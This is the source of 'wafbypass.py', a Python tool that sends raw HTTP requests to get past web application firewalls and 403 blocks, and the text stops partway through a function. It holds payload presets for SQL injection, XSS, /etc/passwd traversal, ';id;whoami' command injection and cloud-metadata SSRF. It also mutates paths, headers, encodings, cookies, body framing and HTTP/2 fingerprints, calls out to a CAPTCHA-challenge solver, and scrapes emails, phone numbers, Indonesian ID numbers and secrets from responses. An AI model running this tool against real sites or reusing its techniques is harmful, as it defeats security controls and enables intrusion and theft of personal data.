#!/usr/bin/env python3
"""wafbypass.py - 403/WAF bypass sweep engine over raw sockets.

The request-target is built by hand and written to the socket unchanged, so
%2e, //, ..;/, %00 and backslashes reach the WAF/origin exactly as typed.
No requests/urllib transport is used against the target; urllib.parse only
parses the URL supplied by the operator.

Baseline: the un-obfuscated attack for the selected mode - a GET with the
raw payload injected into the query for payload-bearing modes (encoding/all),
the canonical urlencoded POST for body mode, otherwise the URL as given. A
baseline that already answers 2xx/3xx means nothing is blocked, so the run prints
an "[i] baseline already returns 2xx/3xx" line and no BYPASS can be proven.

Verdicts per response (relative to the baseline and a soft-404 control):
  ERROR     no response
  BLOCKED   same status as baseline AND body similarity >= 0.95
  NOTFOUND  same status as control  AND body similarity >= 0.90
  BYPASS    2xx/3xx, non-empty body, similarity to baseline < 0.90 and the
            response does not match the control signature
  DIFF      anything else
  UNSTABLE  a BYPASS/DIFF candidate whose re-send (same bytes, fresh
            connection) changed status or body hash; never reported as BYPASS

Profiles select the size-family limits (PROFILE_LIMITS); the size family
pairs "payload at offset L-16" against "payload at offset 0" and only calls
the padded request a BYPASS when the offset-0 control is blocked.

Exit: 0 if at least one BYPASS, 1 if none, 2 on fatal error.
"""
from __future__ import annotations

import argparse
import base64
import difflib
import hashlib
import json
import os
import random
import re
import shutil
import signal
import socket
import ssl
import string
import subprocess
import sys
import textwrap
import threading
try:
    import readline  # noqa: F401  (arrow keys/history; no caret escapes)
except ImportError:
    readline = None
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, urlsplit

import h2

MAX_BODY = 1024 * 1024
MAX_HEADER = 64 * 1024
MAX_VARIANTS = 600
SNIPPET_LEN = 60
SIM_CHARS = 4000

UA_DEFAULT = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36")
UA_GOOGLEBOT = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

VERSION = "0.2.0"
BANNER = r"""
██╗    ██╗ █████╗ ███████╗██╗  ██╗ ██████╗ ██████╗ ██╗  ██╗
██║    ██║██╔══██╗██╔════╝██║  ██║██╔═████╗╚════██╗╚██╗██╔╝
██║ █╗ ██║███████║█████╗  ███████║██║██╔██║ █████╔╝ ╚███╔╝
██║███╗██║██╔══██║██╔══╝  ╚════██║████╔╝██║ ╚═══██╗ ██╔██╗
╚███╔███╔╝██║  ██║██║          ██║╚██████╔╝██████╔╝██╔╝ ██╗
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝          ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝
"""

PRESETS = {
    "sqli": "' UNION SELECT 1,2,3-- -",
    "xss": "<script>alert(1)</script>",
    "lfi": "../../../../etc/passwd",
    "rce": ";id;whoami",
    "ssrf": "http://169.254.169.254/latest/meta-data/",
    "ssti": "{{7*7}}${7*7}",
}
DEFAULT_PAYLOAD = "' OR 1=1--"

# Per-vendor response-size limits used by the size family (bytes). Each limit L
# builds a body whose payload starts at offset L-16 plus an offset-0 control.
PROFILE_LIMITS = {
    "generic": [8192, 65536],
    "cloudflare": [131072, 1048576],
    "aws": [8192, 16384, 65536],
    "akamai": [131072],
    "imperva": [131072],
    "f5": [131072],
    "azure": [131072],
    "gcp": [65536],
    "modsec": [131072],
    "wordpress": [131072],
}


# --------------------------------------------------------------------------
# target / request
# --------------------------------------------------------------------------
class Target(object):
    __slots__ = ("scheme", "host", "port", "host_header", "path", "query")

    def __init__(self, scheme, host, port, host_header, path, query):
        self.scheme = scheme
        self.host = host
        self.port = port
        self.host_header = host_header
        self.path = path
        self.query = query

    @property
    def target(self):
        return self.path + ("?" + self.query if self.query else "")


def parse_url(url):
    if "://" not in url:
        url = "http://" + url
    p = urlsplit(url)
    scheme = p.scheme.lower()
    if scheme not in ("http", "https"):
        raise ValueError("unsupported scheme: %s" % scheme)
    host = p.hostname
    if not host:
        raise ValueError("no host in URL")
    try:
        port = p.port
    except ValueError:
        raise ValueError("bad port in URL")
    if port is None:
        port = 443 if scheme == "https" else 80
    host_header = p.netloc.rsplit("@", 1)[-1]
    path = p.path or "/"
    return Target(scheme, host, port, host_header, path, p.query)


class Response(object):
    __slots__ = ("status", "headers", "body", "error", "cookies", "hops",
                 "final_method")

    def __init__(self, status, headers, body, error=None, cookies=None, hops=0,
                 final_method=None):
        self.status = status
        self.headers = headers
        self.body = body
        self.error = error
        self.cookies = cookies or []
        self.hops = hops
        self.final_method = final_method

    def text(self):
        return self.body[:SIM_CHARS * 4].decode("utf-8", "replace")[:SIM_CHARS]

    @property
    def length(self):
        return len(self.body)


def wire_safe(target):
    """Escape only octets that are illegal inside an HTTP request-target.

    Percent-encoded sequences, %2e, //, ..;/, backslashes and %00 pass through
    untouched; raw spaces and controls get %XX so the request line stays
    parseable instead of being rejected with 400 by the server.
    """
    out = []
    for ch in target:
        o = ord(ch)
        if o < 0x21 or o == 0x7F:
            out.append("%%%02X" % o)
        elif o > 0x7E:
            out.extend("%%%02X" % b for b in ch.encode("utf-8", "replace"))
        else:
            out.append(ch)
    return "".join(out)


def build_request(t, method, target, headers=None, body=None, ua=UA_DEFAULT):
    hdrs = [
        ("Host", t.host_header),
        ("User-Agent", ua),
        ("Accept", "*/*"),
        ("Accept-Encoding", "identity"),
        ("Connection", "close"),
    ]
    if body is not None:
        if not (headers or {}).get("Transfer-Encoding"):
            hdrs.append(("Content-Length", str(len(body))))
    for k, v in (headers or {}).items():
        hdrs.append((k, v))
    out = ["%s %s HTTP/1.1" % (method, wire_safe(target))]
    for k, v in hdrs:
        out.append("%s: %s" % (k, v))
    raw = ("\r\n".join(out) + "\r\n\r\n").encode("latin-1", "replace")
    if body:
        raw += body
    return raw


def _recv_all(sock, max_body=MAX_BODY):
    """Read until close or the body cap. Returns (data, timed_out)."""
    chunks = []
    total = 0
    limit = max_body + MAX_HEADER
    timed_out = False
    while total < limit:
        try:
            buf = sock.recv(65536)
        except socket.timeout:
            timed_out = True
            break
        except OSError:
            break
        if not buf:
            break
        chunks.append(buf)
        total += len(buf)
    return b"".join(chunks), timed_out


def _dechunk(data):
    """Decode chunked framing. Returns (body, saw_zero_chunk)."""
    out = []
    pos = 0
    n = len(data)
    complete = False
    while pos < n:
        eol = data.find(b"\r\n", pos)
        if eol < 0:
            break
        size_line = data[pos:eol].split(b";")[0].strip()
        if not size_line:
            pos = eol + 2
            continue
        try:
            size = int(size_line, 16)
        except ValueError:
            break
        pos = eol + 2
        if size == 0:
            complete = True
            break
        out.append(data[pos:pos + size])
        pos += size + 2
    return b"".join(out), complete


def parse_response(data, max_body=MAX_BODY, timed_out=False, method="GET"):
    if not data:
        return Response(0, {}, b"", "empty response")
    sep = data.find(b"\r\n\r\n")
    hdr_end = 4
    if sep < 0:
        sep = data.find(b"\n\n")
        hdr_end = 2
    if sep < 0:
        return Response(0, {}, b"", "no header terminator")
    head = data[:sep].decode("latin-1", "replace")
    body = data[sep + hdr_end:]
    lines = head.splitlines()
    if not lines:
        return Response(0, {}, b"", "empty status line")
    parts = lines[0].split()
    if len(parts) < 2 or not parts[1].isdigit():
        return Response(0, {}, b"", "bad status line: %r" % lines[0][:80])
    status = int(parts[1])
    headers = {}
    cookies = []
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            key = k.strip().lower()
            headers[key] = v.strip()
            if key == "set-cookie":
                cookies.append(v.strip())
    te = headers.get("transfer-encoding", "").lower()
    # A response that ended at a read timeout with framing that promised more
    # bytes is truncated, not a small page: callers must not diff prefixes of
    # a page against a whole one.
    capped = len(data) >= max_body + MAX_HEADER
    wants_body = method != "HEAD" and status >= 200 and status not in (204, 304)
    if "chunked" in te:
        body, complete = _dechunk(body)
        if wants_body and not complete and not capped:
            reason = "read timeout" if timed_out else "connection closed"
            return Response(0, headers, b"", "truncated chunked body (%s)" % reason)
    elif "content-length" in headers:
        try:
            cl = int(headers["content-length"])
        except ValueError:
            cl = None
        if cl is not None:
            if wants_body and not capped and len(body) < cl:
                reason = "read timeout" if timed_out else "connection closed"
                return Response(0, headers, b"",
                                "truncated body: %d/%d bytes (%s)"
                                % (len(body), cl, reason))
            body = body[:cl]
    elif timed_out and wants_body and not capped:
        return Response(0, headers, b"",
                        "read timeout with close-delimited body")
    if len(body) > max_body:
        body = body[:max_body]
    return Response(status, headers, body, cookies=cookies)


def _tls_context(opts, alpn=None):
    ctx = ssl._create_unverified_context()
    if opts.get("ciphers"):
        ctx.set_ciphers(opts["ciphers"])
    lo = opts.get("tls_min")
    hi = opts.get("tls_max")
    if lo:
        ctx.minimum_version = getattr(ssl.TLSVersion, lo)
    if hi:
        ctx.maximum_version = getattr(ssl.TLSVersion, hi)
    proto = alpn if alpn is not None else opts.get("alpn")
    if proto:
        ctx.set_alpn_protocols(proto)
    return ctx


def send_raw(t, raw, timeout, opts=None, method="GET"):
    opts = opts or {}
    sock = None
    try:
        sock = socket.create_connection((t.host, t.port), timeout=timeout)
        sock.settimeout(timeout)
        if t.scheme == "https":
            sock = _tls_context(opts).wrap_socket(sock, server_hostname=t.host)
        sock.sendall(raw)
        data, timed_out = _recv_all(sock, opts.get("max_body", MAX_BODY))
    except (socket.timeout, OSError, ssl.SSLError) as exc:
        return Response(0, {}, b"", "%s: %s" % (type(exc).__name__, exc))
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
    return parse_response(data, opts.get("max_body", MAX_BODY),
                          timed_out=timed_out, method=method)


def send_h2(t, v, headers, timeout, opts):
    profile = v.get("h2_profile") or opts["http2"]
    order = v.get("h2_order")
    priority = v.get("h2_priority")
    hdrs = {"Host": t.host_header,
            "User-Agent": opts.get("ua", UA_DEFAULT), "Accept": "*/*"}
    hdrs.update(headers)
    sock = None
    try:
        sock = socket.create_connection((t.host, t.port), timeout=timeout)
        sock.settimeout(timeout)
        if t.scheme == "https":
            ctx = _tls_context(opts, ["h2"])
            sock = ctx.wrap_socket(sock, server_hostname=t.host)
            if sock.selected_alpn_protocol() != "h2":
                return Response(0, {}, b"",
                                "ALPN negotiated %r, not h2"
                                % sock.selected_alpn_protocol())
        status, hlist, body, err = h2.request(
            sock, v["method"], wire_safe(v["target"]), hdrs, v["body"],
            scheme=t.scheme, profile=profile, order=order, priority=priority)
    except (socket.timeout, OSError, ssl.SSLError, ValueError) as exc:
        return Response(0, {}, b"", "%s: %s" % (type(exc).__name__, exc))
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
    if err:
        return Response(0, {}, b"", err)
    body = body[:opts.get("max_body", MAX_BODY)]
    out_headers = {}
    cookies = []
    for name, value in hlist:
        key = name.lower()
        out_headers[key] = value
        if key == "set-cookie":
            cookies.append(value)
    return Response(status, out_headers, body, cookies=cookies)


def _jar_header(jar):
    if not jar:
        return None
    return "; ".join("%s=%s" % (k, v) for k, v in jar.items())


def _jar_update(jar, cookies, lock):
    for raw in cookies or ():
        pair = raw.split(";", 1)[0].strip()
        if "=" not in pair:
            continue
        name, value = pair.split("=", 1)
        name = name.strip()
        if not name:
            continue
        with lock:
            jar[name] = value.strip()


def _send_once(t, v, timeout, opts, cookie_hdr):
    headers = dict(v["headers"])
    if cookie_hdr and not any(k.lower() == "cookie" for k in headers):
        headers["Cookie"] = cookie_hdr
    if opts["http2"] != "off":
        return send_h2(t, v, headers, timeout, opts)
    raw = build_request(t, v["method"], v["target"], headers, v["body"],
                        opts.get("ua", UA_DEFAULT))
    return send_raw(t, raw, timeout, opts, method=v["method"])


def _same_host(t, url):
    try:
        nt = parse_url(url)
    except ValueError:
        return None
    if nt.host != t.host:
        return None
    return nt


def fetch(t, v, timeout, delay, opts, jar=None, jar_lock=None):
    if delay:
        time.sleep(delay)
    opts = opts or {}
    jar_lock = jar_lock or threading.Lock()
    cookie_hdr = _jar_header(jar) if jar is not None else None
    resp = _send_once(t, v, timeout, opts, cookie_hdr)
    if jar is not None:
        _jar_update(jar, resp.cookies, jar_lock)
    resp.final_method = v["method"]
    if not opts.get("follow"):
        return resp
    from urllib.parse import urljoin
    hops = 0
    cur_t, cur_v = t, v
    while (resp.status in (301, 302, 303, 307, 308)
           and hops < opts["follow"] and resp.headers.get("location")):
        nt = _same_host(t, urljoin("%s://%s" % (t.scheme, t.host_header),
                                   resp.headers["location"]))
        if nt is None:
            break
        keep = resp.status in (307, 308)
        cur_t = nt
        cur_v = mk(cur_v["mode"], cur_v["name"] + "-hop",
                   cur_v["method"] if keep else "GET", nt.target,
                   headers=cur_v["headers"],
                   body=cur_v["body"] if keep else None)
        cookie_hdr = _jar_header(jar) if jar is not None else None
        resp = _send_once(cur_t, cur_v, timeout, opts, cookie_hdr)
        if jar is not None:
            _jar_update(jar, resp.cookies, jar_lock)
        hops += 1
        resp.hops = hops
        resp.final_method = cur_v["method"]
    return resp


# --------------------------------------------------------------------------
# verdicts
# --------------------------------------------------------------------------
def similarity(a, b):
    sa = a[:SIM_CHARS]
    sb = b[:SIM_CHARS]
    if not sa and not sb:
        return 1.0
    return difflib.SequenceMatcher(None, sa, sb).ratio()


CHALLENGE_MARKERS = (
    b"just a moment", b"cf-chl", b"checking your browser",
    b"enable javascript and cookies", b"attention required",
    b"unusual traffic", b"px-captcha", b"captcha-delivery",
    b"verify you are human", b"ddos-guard", b"_incapsula_resource",
    b"please wait while we verify", b"turnstile",
)


def challenge_kind(resp):
    """Return a marker string when the response is a JS/CAPTCHA challenge."""
    if resp.status == 0:
        return None
    if resp.headers.get("cf-mitigated"):
        return "cf-mitigated"
    if resp.headers.get("x-amzn-waf-action") == "captcha":
        return "x-amzn-waf-action"
    if resp.status in (403, 429, 503):
        low = resp.body[:200000].lower()
        for marker in CHALLENGE_MARKERS:
            if marker in low:
                return marker.decode("latin-1")
    return None


def classify(resp, base, ctrl):
    if resp.status == 0:
        return "ERROR"
    if challenge_kind(resp):
        return "CHALLENGE"
    txt = resp.text()
    sim_base = similarity(txt, base.text())
    if resp.status == base.status and sim_base >= 0.95:
        return "BLOCKED"
    sim_ctrl = similarity(txt, ctrl.text())
    if resp.status == ctrl.status and sim_ctrl >= 0.90:
        return "NOTFOUND"
    # A bypass needs something blocked to bypass: with a permissive baseline
    # (2xx/3xx) a different 2xx body is an echo/routing differential, not a
    # WAF skip. Size pairs are promoted separately in run().
    base_blocked = not (200 <= base.status < 400)
    if (base_blocked and 200 <= resp.status < 400 and len(resp.body) > 0
            and sim_base < 0.90
            and not (resp.status == ctrl.status and sim_ctrl >= 0.90)):
        return "BYPASS"
    return "DIFF"


def snippet(resp):
    if resp.status == 0:
        return resp.error or "no response"
    txt = " ".join(resp.text().split())
    if not txt:
        return "<empty body>"
    if len(txt) > SNIPPET_LEN:
        txt = txt[:SNIPPET_LEN] + "..."
    return txt


EMAIL_RE = re.compile(rb"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
NIK_RE = re.compile(rb"\b\d{16}\b")
PHONE_RE = re.compile(rb"(?<![0-9.])(?:\+62|62|0)8[1-9]\d{6,11}\b")
SENSITIVE = (b"password", b"passwd", b"api_key", b"apikey", b"secret",
             b"token", b"nik", b"npwp", b"creditcard", b"confidential",
             b"flag{")
FINDING_MARKERS = (b"admin", b"dashboard", b"user list", b"users",
                   b"confidential", b"internal", b"private", b"flag{")


NIK_PROVINCES = set(range(11, 20)) | {21} | set(range(31, 37)) \
    | set(range(51, 54)) | set(range(61, 66)) | set(range(71, 77)) \
    | {81, 82} | set(range(91, 95))


def _valid_nik(raw):
    text = raw.decode("latin-1", "replace")
    if len(text) != 16 or not text.isdigit():
        return False
    if int(text[:2]) not in NIK_PROVINCES:
        return False
    day, month = int(text[6:8]), int(text[8:10])
    if not 1 <= month <= 12:
        return False
    # DD/MM/YY: DD is 01-31 for males and 41-71 for females (birth day + 40).
    if 41 <= day <= 71:
        day -= 40
    return 1 <= day <= 31


def _mask_nik(value):
    text = value.decode("latin-1", "replace")
    if len(text) != 16:
        return text
    return text[:6] + "****" + text[-4:]


def _pick_excerpt(text, title, needles):
    """One line of context around the first sensitive token, title stripped."""
    low = text.lower()
    for needle in needles:
        if not needle:
            continue
        pos = low.find(needle.lower())
        if pos >= 0:
            start = max(0, pos - 50)
            boundary = text.rfind(" ", start, pos)
            if boundary >= 0:
                start = boundary + 1
            return " ".join(text[start:start + 150].split())
    if title and text.startswith(title):
        text = text[len(title):].strip()
    return " ".join(text[:140].split())


def finding(resp):
    """Filtered disclosure view: values, severity, one context excerpt."""
    body = resp.body
    low = body.lower()
    title = ""
    match = re.search(rb"<title[^>]*>(.*?)</title>", body, re.I | re.S)
    if match:
        title = " ".join(match.group(1).decode("utf-8", "replace").split())[:90]
    text = re.sub(rb"<script.*?</script>|<style.*?</style>", b" ", body,
                  flags=re.I | re.S)
    text = re.sub(rb"<[^>]+>", b" ", text)
    text = " ".join(text.decode("utf-8", "replace").split())
    emails = sorted(set(x.decode("latin-1", "replace")
                        for x in EMAIL_RE.findall(body)))[:10]
    phones = []
    for x in sorted(set(PHONE_RE.findall(body))):
        phones.append(x.decode("latin-1", "replace"))
    seen = {}
    for p in phones:
        seen.setdefault(p.lstrip("+"), p)
    phones = list(seen.values())[:10]
    raw_niks = sorted(set(x for x in NIK_RE.findall(body) if _valid_nik(x)))[:10]
    niks = []
    for x in raw_niks:
        m = _mask_nik(x)
        if m not in niks:
            niks.append(m)
    sensitive = [m.decode() for m in SENSITIVE
                 if (m == b"flag{" and m in low)
                 or re.search(rb"\b" + re.escape(m) + rb"\b", low)][:8]
    high_secrets = [m for m in sensitive
                    if m in ("password", "passwd", "api_key", "apikey",
                             "secret", "token", "credential", "creditcard",
                             "flag{")]
    if raw_niks or high_secrets:
        severity = "high"
    elif emails or phones:
        severity = "medium"
    else:
        severity = "low"
    excerpt = _pick_excerpt(text, title, high_secrets + emails + phones
                            + [x.decode("latin-1", "replace") for x in raw_niks])
    return {
        "title": title,
        "snippet": excerpt,
        "emails": len(emails),
        "emails_list": emails,
        "phones": len(phones),
        "phones_list": phones,
        "niks": len(raw_niks),
        "niks_list": niks,
        "links": len(re.findall(rb"href=", low)),
        "sensitive": sensitive,
        "severity": severity,
        "markers": [m.decode() for m in FINDING_MARKERS if m in low][:8],
    }


# --------------------------------------------------------------------------
# variants
# --------------------------------------------------------------------------
def toggle_case(path):
    return path.swapcase()


def inject_query(query, param, value):
    pairs = query.split("&") if query else []
    out = []
    found = False
    for pair in pairs:
        key = pair.split("=", 1)[0]
        if key == param:
            out.append(param + "=" + value)
            found = True
        else:
            out.append(pair)
    if not found:
        out.append(param + "=" + value)
    return "&".join(out)


def mk(mode, name, method, target, headers=None, body=None, **extra):
    out = {"mode": mode, "name": name, "method": method,
           "target": target, "headers": headers or {}, "body": body}
    out.update(extra)
    return out


def path_variants(t):
    p = t.path
    q = ("?" + t.query) if t.query else ""
    bare = p.lstrip("/")
    items = [
        ("double-slash", "//" + bare),
        ("dot-segment", "/./" + bare),
        ("pct-dot", "/%2e/" + bare),
        ("double-pct-dot", "/%252e/" + bare),
        ("semicolon-suffix", p + ";"),
        ("dotdot-semicolon", p + "/..;/"),
        ("trailing-dot", p + "/."),
        ("trailing-slash", p + "/"),
        ("space-suffix", p + "%20"),
        ("tab-suffix", p + "%09"),
        ("nul-suffix", p + "%00"),
        ("nul-png", p + "%00.png"),
        ("slash-to-pct2f", p.replace("/", "%2f")),
        ("slash-to-pct252f", p.replace("/", "%252f")),
        ("backslash", "/" + "\\" + bare),
        ("backslash-pct", "/%5c" + bare),
        ("case-toggle", toggle_case(p)),
        ("dotdot-prefix", "/foo/../" + bare),
    ]
    return [mk("path", name, "GET", path + q) for name, path in items]


def header_variants(t):
    tgt = t.target
    origin = "%s://%s" % (t.scheme, t.host_header)
    items = [
        ("xff-127.0.0.1", {"X-Forwarded-For": "127.0.0.1"}),
        ("xff-localhost", {"X-Forwarded-For": "localhost"}),
        ("x-forwarded-host", {"X-Forwarded-Host": t.host_header}),
        ("x-original-url", {"X-Original-URL": tgt}),
        ("x-rewrite-url", {"X-Rewrite-URL": tgt}),
        ("x-real-ip", {"X-Real-IP": "127.0.0.1"}),
        ("x-client-ip", {"X-Client-IP": "127.0.0.1"}),
        ("x-remote-ip", {"X-Remote-IP": "127.0.0.1"}),
        ("x-remote-addr", {"X-Remote-Addr": "127.0.0.1"}),
        ("true-client-ip", {"True-Client-IP": "127.0.0.1"}),
        ("cf-connecting-ip", {"CF-Connecting-IP": "127.0.0.1"}),
        ("forwarded-for", {"Forwarded": "for=127.0.0.1"}),
        ("x-http-method-override", {"X-HTTP-Method-Override": "GET"}),
        ("x-method-override", {"X-Method-Override": "GET"}),
        ("ua-googlebot", {"User-Agent": UA_GOOGLEBOT}),
        ("referer-same-origin", {"Referer": origin + t.path}),
    ]
    return [mk("header", name, "GET", tgt, headers=h) for name, h in items]


def method_variants(t):
    out = []
    for m in ("GET", "HEAD", "OPTIONS", "PUT", "PATCH", "TRACE", "POST"):
        out.append(mk("method", "method-" + m, m, t.target))
    out.append(mk("method", "override-post", "POST", t.target,
                  headers={"X-HTTP-Method-Override": "GET"}))
    return out


def body_variants(t, param, payload):
    pct = quote(payload, safe="")
    form = ("%s=%s" % (param, pct)).encode("latin-1")
    boundary = "----wafbypass7f3a9c"
    multipart = (
        "--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n--%s--\r\n"
        % (boundary, param, payload, boundary)
    ).encode("latin-1")
    chunked = b"".join(
        [("%x\r\n" % len(form)).encode(), form, b"\r\n", b"0\r\n\r\n"]
    )
    js = json.dumps({param: payload}).encode("latin-1")
    items = [
        ("urlencoded", "POST", t.target,
         {"Content-Type": "application/x-www-form-urlencoded"}, form),
        ("json", "POST", t.target,
         {"Content-Type": "application/json"}, js),
        ("multipart", "POST", t.target,
         {"Content-Type": "multipart/form-data; boundary=" + boundary}, multipart),
        ("chunked", "POST", t.target,
         {"Content-Type": "application/x-www-form-urlencoded",
          "Transfer-Encoding": "chunked"}, chunked),
        ("hpp", "POST", t.target,
         {"Content-Type": "application/x-www-form-urlencoded"},
         ("%s=1&%s=%s" % (param, param, pct)).encode("latin-1")),
        ("semicolon", "POST", t.target,
         {"Content-Type": "application/x-www-form-urlencoded"},
         ("%s=1;%s=%s" % (param, param, pct)).encode("latin-1")),
        ("append-param", "POST", t.target,
         {"Content-Type": "application/x-www-form-urlencoded"},
         ("x=1&%s=%s" % (param, pct)).encode("latin-1")),
    ]
    return [mk("body", name, m, tgt, headers=h, body=b) for name, m, tgt, h, b in items]


def encode_payloads(payload):
    raw = quote(payload, safe="!$&'()*+,-./:;=?@_~")
    url = quote(payload, safe="")
    dbl = quote(url, safe="")
    uxxxx = "".join("%%u%04x" % ord(c) for c in payload)
    hexs = "0x" + payload.encode("latin-1", "replace").hex()
    comment = payload.replace(" ", "/**/")
    mysql = payload
    for kw in ("union", "select", "UNION", "SELECT"):
        mysql = mysql.replace(kw, "/*!50000%s*/" % kw)
    case = payload.swapcase()
    plus = payload.replace(" ", "+")
    tab = payload.replace(" ", "%09")
    b64 = quote(base64.b64encode(payload.encode("latin-1", "replace")).decode(), safe="=")
    html = "".join("&#x%x;" % ord(c) for c in payload)
    return [
        ("raw", raw),
        ("url", url),
        ("double-url", dbl),
        ("uxxxx", uxxxx),
        ("hex", hexs),
        ("comment-space", comment),
        ("mysql-comment", mysql),
        ("case-toggle", case),
        ("plus-space", plus),
        ("tab-space", tab),
        ("base64", b64),
        ("html-entity", html),
    ]


def encoding_variants(t, param, payload):
    out = []
    for name, enc in encode_payloads(payload):
        q = inject_query(t.query, param, enc)
        out.append(mk("encoding", "enc-" + name, "GET", t.path + "?" + q))
    return out


def octal_escape(payload):
    return "".join("\\%03o" % b for b in payload.encode("latin-1", "replace"))


def cookie_variants(t, payload):
    """Plain vs phantom-octal vs duplicate cookie, all reaching the same app."""
    return [
        mk("cookie", "cookie-plain", "GET", t.target,
           headers={"Cookie": "q=" + payload}),
        mk("cookie", "cookie-phantom-octal", "GET", t.target,
           headers={"Cookie": '$Version=1; q="' + octal_escape(payload) + '"'}),
        mk("cookie", "cookie-duplicate", "GET", t.target,
           headers={"Cookie": "q=1; q=" + payload}),
    ]


def ctype_variants(t, param, payload):
    """Same payload, four Content-Type framings (parser differential)."""
    pct = quote(payload, safe="")
    boundary = "----wafbypassctype7f3a"
    multipart = (
        "--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n--%s--\r\n"
        % (boundary, param, payload, boundary)
    ).encode("latin-1", "replace")
    items = [
        ("ctype-json", "application/json",
         json.dumps({param: payload}).encode("latin-1")),
        ("ctype-urlencoded", "application/x-www-form-urlencoded",
         ("%s=%s" % (param, pct)).encode("latin-1")),
        ("ctype-multipart", "multipart/form-data; boundary=" + boundary,
         multipart),
        ("ctype-text", "text/plain; charset=utf-8",
         payload.encode("latin-1", "replace")),
    ]
    return [mk("ctype", name, "POST", t.target, {"Content-Type": ctype}, body)
            for name, ctype, body in items]


def size_variants(t, profile, payload):
    """Payload at offset L-16 vs offset 0, one padded/control pair per limit."""
    pb = payload.encode("latin-1", "replace")
    out = []
    for limit in PROFILE_LIMITS[profile]:
        filler = b"A" * max(0, limit - 16)
        key = "size-%d" % limit
        out.append(mk("size", key, "POST", t.target,
                      {"Content-Type": "application/x-www-form-urlencoded"},
                      filler + pb, pair=key, role="padded"))
        out.append(mk("size", key + "-ctl", "POST", t.target,
                      {"Content-Type": "application/x-www-form-urlencoded"},
                      pb + filler, pair=key, role="ctl"))
    return out


# Escalation level per variant: 1 = single obvious rewrite, 2 = one parser
# differential, 3 = double layer, 4 = null/destructive framing and size windows.
# Variants not listed default to level 2.
LEVELS = {
    "double-slash": 1, "dot-segment": 1, "trailing-slash": 1, "case-toggle": 1,
    "pct-dot": 2, "semicolon-suffix": 2, "trailing-dot": 2, "space-suffix": 2,
    "tab-suffix": 2, "slash-to-pct2f": 2, "backslash": 2, "backslash-pct": 2,
    "dotdot-prefix": 2, "double-pct-dot": 3, "slash-to-pct252f": 3,
    "dotdot-semicolon": 4, "nul-suffix": 4, "nul-png": 4,

    "xff-127.0.0.1": 1, "ua-googlebot": 1, "referer-same-origin": 1,
    "x-forwarded-host": 1, "xff-localhost": 2, "x-original-url": 2,
    "x-rewrite-url": 2, "x-http-method-override": 2, "x-method-override": 2,
    "true-client-ip": 3, "cf-connecting-ip": 3, "forwarded-for": 3,
    "x-real-ip": 4, "x-client-ip": 4, "x-remote-ip": 4, "x-remote-addr": 4,

    "method-GET": 1, "method-HEAD": 1, "method-OPTIONS": 1,
    "method-PUT": 2, "method-PATCH": 2, "method-POST": 2,
    "method-TRACE": 3, "override-post": 4,

    "urlencoded": 1, "json": 2, "append-param": 2,
    "multipart": 3, "hpp": 3, "semicolon": 3, "chunked": 4,

    "enc-raw": 1, "enc-url": 1, "enc-double-url": 2, "enc-case-toggle": 2,
    "enc-plus-space": 2, "enc-tab-space": 2, "enc-comment-space": 2,
    "enc-uxxxx": 3, "enc-hex": 3, "enc-mysql-comment": 3,
    "enc-base64": 4, "enc-html-entity": 4,

    "cookie-plain": 1, "cookie-duplicate": 3, "cookie-phantom-octal": 4,

    "ctype-urlencoded": 1, "ctype-json": 2, "ctype-text": 2, "ctype-multipart": 3,
}


def variant_level(v):
    if v["mode"] == "size":
        return 4
    if v["mode"] == "h2":
        return 1
    return LEVELS.get(v["name"], 2)


BENIGN = "wafbypass_probe_9f3a"


def twin_variant(v, t, param, profile):
    """Same transform, harmless payload; None when the variant has no payload."""
    mode = v["mode"]
    if mode == "encoding":
        cands = encoding_variants(t, param, BENIGN)
    elif mode == "cookie":
        cands = cookie_variants(t, BENIGN)
    elif mode == "ctype":
        cands = ctype_variants(t, param, BENIGN)
    elif mode == "body":
        cands = body_variants(t, param, BENIGN)
    elif mode == "size":
        cands = size_variants(t, profile, BENIGN)
    else:
        return None
    for cand in cands:
        if cand["name"] == v["name"]:
            return cand
    return None


def h2_variants(t):
    """Same request, different client fingerprints; each opens a connection."""
    out = []
    for order in ("chrome", "firefox", "safari"):
        out.append(mk("h2", "h2-order-" + order, "GET", t.target,
                      h2_order=order))
    for profile in ("chrome", "firefox", "safari", "nghttp2", "plain"):
        out.append(mk("h2", "h2-profile-" + profile, "GET", t.target,
                      h2_profile=profile))
    out.append(mk("h2", "h2-priority-tree", "GET", t.target,
                  h2_priority="chrome"))
    out.append(mk("h2", "h2-priority-none", "GET", t.target,
                  h2_priority="none"))
    return out


def build_variants(t, modes, param, payload, profile, level=4):
    out = []
    if "path" in modes:
        out += path_variants(t)
    if "header" in modes:
        out += header_variants(t)
    if "method" in modes:
        out += method_variants(t)
    if "body" in modes:
        out += body_variants(t, param, payload)
    if "encoding" in modes:
        out += encoding_variants(t, param, payload)
    if "cookie" in modes:
        out += cookie_variants(t, payload)
    if "ctype" in modes:
        out += ctype_variants(t, param, payload)
    if "size" in modes:
        out += size_variants(t, profile, payload)
    if "h2" in modes:
        out += h2_variants(t)
    return [v for v in out if variant_level(v) <= level][:MAX_VARIANTS]


# --------------------------------------------------------------------------
# run
# --------------------------------------------------------------------------
def fmt_bytes(n):
    return "%d" % n


def solve_challenge(url, python, timeout, refresh=False):
    """Run challenge.py under the solver venv and return (data, error)."""
    worker = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "challenge.py")
    cmd = [python, worker, url, str(timeout)]
    if refresh:
        cmd.append("--refresh")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True,
                              timeout=timeout + 180)
    except (OSError, subprocess.TimeoutExpired) as exc:
        return None, "%s: %s" % (type(exc).__name__, exc)
    line = ""
    for candidate in reversed(proc.stdout.splitlines()):
        if candidate.strip().startswith("{"):
